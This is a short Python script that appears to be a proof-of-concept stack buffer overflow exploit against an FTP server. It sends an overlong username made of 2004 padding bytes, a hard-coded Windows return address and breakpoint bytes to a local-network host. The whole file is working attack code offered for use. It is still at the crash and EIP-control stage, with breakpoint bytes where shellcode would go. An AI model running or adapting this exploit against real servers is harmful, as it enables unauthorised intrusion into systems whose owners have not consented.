import ftplib
import struct 

buffer="A" * 2004
buffer += struct.pack('<L', 0x7C86467B)
buffer +="CCCC"
buffer +="\xCC\xCC"

ftp = ftplib.FTP('192.168.0.1', buffer, 'test')
